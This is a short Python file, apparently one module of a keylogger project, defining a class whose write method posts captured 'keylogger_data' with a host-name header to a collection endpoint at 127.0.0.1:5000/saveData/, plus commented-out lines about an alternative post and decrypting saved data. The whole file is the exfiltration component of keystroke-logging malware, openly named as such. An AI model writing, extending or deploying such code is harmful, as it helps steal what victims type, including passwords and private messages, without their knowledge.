import requests
class SendToNetwork:
    def write(self, keylogger_data,host_name):

        # requests.post("http://127.0.0.1:5000", json=keylogger_data,headers={"host_name":host_name})
        requests.post(
            "http://127.0.0.1:5000/saveData/",
            json=keylogger_data,
            headers={"Host-Name": host_name}
        )

        # save_decrypted_data(keylogger_data)


